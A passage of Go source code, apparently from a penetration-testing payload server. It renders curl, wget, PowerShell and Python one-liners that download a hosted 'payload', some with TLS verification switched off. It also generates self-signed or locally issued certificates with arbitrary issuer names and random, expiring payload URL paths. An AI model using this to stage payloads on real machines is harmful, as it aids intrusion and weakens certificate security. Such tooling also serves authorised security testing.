	pythonStdlibCommand := fmt.Sprintf(
		"python3 -c 'import urllib.request; open(%s,\"wb\").write(urllib.request.urlopen(%s).read())'",
		strconv.Quote(options.OutputFile),
		strconv.Quote(options.URL),
	)
	if needsCertificateBypass {
		pythonStdlibCommand = fmt.Sprintf(
			"python3 -c 'import ssl,urllib.request; ctx=ssl._create_unverified_context(); open(%s,\"wb\").write(urllib.request.urlopen(%s, context=ctx).read())'",
			strconv.Quote(options.OutputFile),
			strconv.Quote(options.URL),
		)
	}

	pythonRequestsCommand := fmt.Sprintf(
		"python3 -c 'import requests; open(%s,\"wb\").write(requests.get(%s, timeout=30).content)'",
		strconv.Quote(options.OutputFile),
		strconv.Quote(options.URL),
	)
	if needsCertificateBypass {
		pythonRequestsCommand = fmt.Sprintf(
			"python3 -c 'import requests,urllib3; urllib3.disable_warnings(); open(%s,\"wb\").write(requests.get(%s, verify=False, timeout=30).content)'",
			strconv.Quote(options.OutputFile),
			strconv.Quote(options.URL),
		)
	}

	return []DownloadCommand{
		{Label: "curl", Command: strings.Join(curlArgs, " ")},
		{Label: "wget", Command: strings.Join(wgetArgs, " ")},
		{Label: "PowerShell 7+", Command: powershellCommand},
		{Label: "Windows PowerShell 5.1", Command: windowsPowerShellCommand},
		{Label: "Python stdlib", Command: pythonStdlibCommand},
		{Label: "Python requests", Command: pythonRequestsCommand},
	}
}

func posixQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'"
}

func powershellQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "''") + "'"
}

func printPayloadCommands(options DownloadCommandOptions) {
	fmt.Printf("[+] Payload available at: %s\n", options.URL)
	fmt.Printf("[+] Output filename: %s\n", options.OutputFile)
	if options.MaxDownloads == 0 {
		fmt.Println("[+] Payload path policy: persistent")
	} else {
		fmt.Printf("[+] Payload path policy: expires after %d download(s)\n", options.MaxDownloads)
	}
	if options.LocalCACert {
		fmt.Println("[+] Certificate: generated local CA, not trusted by default; commands include local certificate-check bypass flags")
	} else if options.SelfSignedCert {
		fmt.Println("[+] Certificate: self-signed; commands include local certificate-check bypass flags")
	} else {
		fmt.Println("[+] Certificate: trusted or externally provided; commands verify TLS by default")
	}
	fmt.Println("")
	fmt.Println("[Download Commands]")
	for _, command := range renderDownloadCommands(options) {
		fmt.Printf("[%s]\n", command.Label)
		fmt.Printf("> %s\n\n", command.Command)
	}
}

func loadCertConfig(path string, profileName string) (*CertConfig, string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}

	var fields map[string]json.RawMessage
	if err := json.Unmarshal(data, &fields); err != nil {
		return nil, "", err
	}
	_, hasProfiles := fields["profiles"]
	_, hasDefaultProfile := fields["default_profile"]
	if hasProfiles || hasDefaultProfile {
		var profileConfig CertProfileConfig
		if err := json.Unmarshal(data, &profileConfig); err != nil {
			return nil, "", err
		}
		config, selectedProfile, err := selectCertProfile(profileConfig, profileName)
		if err != nil {
			return nil, "", err
		}
		if err := validateCertificateIssuer(config); err != nil {
			return nil, "", fmt.Errorf("profile %q: %w", selectedProfile, err)
		}
		return config, selectedProfile, nil
	}

	var config CertConfig
	err = json.Unmarshal(data, &config)
	if err != nil {
		return nil, "", err
	}
	if profileName != "" {
		return nil, "", fmt.Errorf("certificate profile %q was requested, but %s does not define profiles", profileName, path)
	}
	if err := validateCertificateIssuer(&config); err != nil {
		return nil, "", err
	}

	return &config, "", nil
}

func selectCertProfile(config CertProfileConfig, profileName string) (*CertConfig, string, error) {
	if len(config.Profiles) == 0 {
		return nil, "", fmt.Errorf("certificate config defines profiles but none were provided")
	}

	selectedProfile := profileName
	if selectedProfile == "" {
		selectedProfile = config.DefaultProfile
	}
	if selectedProfile == "" {
		return nil, "", fmt.Errorf("certificate config defines profiles but no default_profile was set")
	}

	certConfig, ok := config.Profiles[selectedProfile]
	if !ok {
		return nil, "", fmt.Errorf("unknown certificate profile %q; available profiles: %s", selectedProfile, availableCertProfiles(config.Profiles))
	}

	return &certConfig, selectedProfile, nil
}

func availableCertProfiles(profiles map[string]CertConfig) string {
	names := make([]string, 0, len(profiles))
	for name := range profiles {
		names = append(names, name)
	}
	sort.Strings(names)
	return fmt.Sprintf("%v", names)
}

func validateCertificateIssuer(config *CertConfig) error {
	if config.Issuer == nil {
		return nil
	}
	issuer := config.Issuer
	for _, field := range []string{issuer.CommonName, issuer.Organization, issuer.OrganizationalUnit, issuer.Country, issuer.Province, issuer.Locality} {
		if strings.TrimSpace(field) != "" {
			return nil
		}
	}
	return fmt.Errorf("issuer must contain at least one non-empty name field; omit issuer to generate a self-signed certificate")
}

func (name CertificateNameConfig) pkixName() pkix.Name {
	optionalName := func(value string) []string {
		if strings.TrimSpace(value) == "" {
			return nil
		}
		return []string{value}
	}
	return pkix.Name{
		Country:            optionalName(name.Country),
		Province:           optionalName(name.Province),
		Locality:           optionalName(name.Locality),
		Organization:       optionalName(name.Organization),
		OrganizationalUnit: optionalName(name.OrganizationalUnit),
		CommonName:         strings.TrimSpace(name.CommonName),
	}
}

func generateCertificateKey(config *CertConfig) (any, error) {
	var priv any
	var err error
	switch config.KeyType {
	case "rsa":
		priv, err = rsa.GenerateKey(crand.Reader, config.RSABits)
	case "ecdsa":
		switch config.ECDSACurve {
		case "P224":
			priv, err = ecdsa.GenerateKey(elliptic.P224(), crand.Reader)
		case "P256":
			priv, err = ecdsa.GenerateKey(elliptic.P256(), crand.Reader)
		case "P384":
			priv, err = ecdsa.GenerateKey(elliptic.P384(), crand.Reader)
		case "P521":
			priv, err = ecdsa.GenerateKey(elliptic.P521(), crand.Reader)
		default:
			return nil, fmt.Errorf("unsupported ECDSA curve: %s", config.ECDSACurve)
		}
	case "ed25519":
		_, priv, err = ed25519.GenerateKey(crand.Reader)
	default:
		return nil, fmt.Errorf("unsupported key type: %s", config.KeyType)
	}
	return priv, err
}

func generateCertificate(config *CertConfig) (CertificateInfo, error) {
	if err := validateCertificateIssuer(config); err != nil {
		return CertificateInfo{}, err
	}
	priv, err := generateCertificateKey(config)
	if err != nil {
		return CertificateInfo{}, err
	}

	keyUsage := x509.KeyUsageDigitalSignature
	if _, isRSA := priv.(*rsa.PrivateKey); isRSA {
		keyUsage |= x509.KeyUsageKeyEncipherment
	}

	notBefore := time.Now()
	if config.ValidFrom != "" {
		notBefore, err = time.Parse("Jan 02 15:04:05 2006", config.ValidFrom)
		if err != nil {
			return CertificateInfo{}, err
		}
	}
	notAfter := notBefore.Add(time.Duration(config.ValidForDays) * 24 * time.Hour)

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := crand.Int(crand.Reader, serialNumberLimit)
	if err != nil {
		return CertificateInfo{}, err
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Country:            []string{config.Country},
			Province:           []string{config.Province},
			Locality:           []string{config.Locality},
			Organization:       []string{config.Organization},
			OrganizationalUnit: []string{config.OrganizationalUnit},
			CommonName:         config.CommonName,
		},
		NotBefore: notBefore,
		NotAfter:  notAfter,
		KeyUsage:  keyUsage,
		ExtKeyUsage: []x509.ExtKeyUsage{
			x509.ExtKeyUsageServerAuth,
		},
		BasicConstraintsValid: true,
	}

	for _, h := range config.Hosts {
		if ip := net.ParseIP(h); ip != nil {
			template.IPAddresses = append(template.IPAddresses, ip)
		} else {
			template.DNSNames = append(template.DNSNames, h)
		}
	}

	if config.IsCA {
		template.IsCA = true
		template.KeyUsage |= x509.KeyUsageCertSign
	}

	parent := &template
	signingKey := priv
	if config.Issuer != nil {
		parent, signingKey, err = generateLocalIssuer(config, &template)
		if err != nil {
			return CertificateInfo{}, fmt.Errorf("generate issuer: %w", err)
		}
	}
	derBytes, err := x509.CreateCertificate(crand.Reader, &template, parent, publicKey(priv), signingKey)
	if err != nil {
		return CertificateInfo{}, err
	}

	privBytes, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		return CertificateInfo{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	if config.Issuer != nil {
		certPEM = append(certPEM, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: parent.Raw})...)
	}
	if err := os.WriteFile("cert.pem", certPEM, 0644); err != nil {
		return CertificateInfo{}, fmt.Errorf("write cert.pem: %w", err)
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: privBytes})
	if err := os.WriteFile("key.pem", keyPEM, 0600); err != nil {
		return CertificateInfo{}, fmt.Errorf("write key.pem: %w", err)
	}

	return CertificateInfo{SelfSigned: config.Issuer == nil, LocalCA: config.Issuer != nil}, nil
}

// generateLocalIssuer creates a separate signing key and self-signed CA. Only
// its public certificate is persisted, as the second certificate in cert.pem.
func generateLocalIssuer(config *CertConfig, leaf *x509.Certificate) (*x509.Certificate, any, error) {
	issuerKey, err := generateCertificateKey(config)
	if err != nil {
		return nil, nil, err
	}
	serialLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := crand.Int(crand.Reader, serialLimit)
	if err != nil {
		return nil, nil, err
	}
	issuer := x509.Certificate{
		SerialNumber:          serialNumber,
		Subject:               config.Issuer.pkixName(),
		NotBefore:             leaf.NotBefore,
		NotAfter:              leaf.NotAfter,
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		MaxPathLen:            0,
		MaxPathLenZero:        true,
	}
	if leaf.IsCA {
		issuer.MaxPathLen = 1
		issuer.MaxPathLenZero = false
	}
	derBytes, err := x509.CreateCertificate(crand.Reader, &issuer, &issuer, publicKey(issuerKey), issuerKey)
	if err != nil {
		return nil, nil, err
	}
	// Parsing makes the encoded subject and generated subject key ID available
	// when signing the server certificate.
	parent, err := x509.ParseCertificate(derBytes)
	if err != nil {
		return nil, nil, err
	}
	return parent, issuerKey, nil
}

func publicKey(priv any) any {
	switch k := priv.(type) {
	case *rsa.PrivateKey:
		return &k.PublicKey
	case *ecdsa.PrivateKey:
		return &k.PublicKey
	case ed25519.PrivateKey:
		return k.Public().(ed25519.PublicKey)
	default:
		return nil
	}
}

func randomPayloadPath() string {
	return "/" + randomString(randomInt(5, 12)) + "/" + randomString(randomInt(5, 12))
}

func randomInt(min int, max int) int {
	if max <= min {
		return min
	}

	n, err := crand.Int(crand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min
	}
	return min + int(n.Int64())
}

func randomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		n, err := crand.Int(crand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			b[i] = charset[0]
			continue
		}
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func check(e error) {
	if e != nil {
		log.Fatal(e)
	}
}
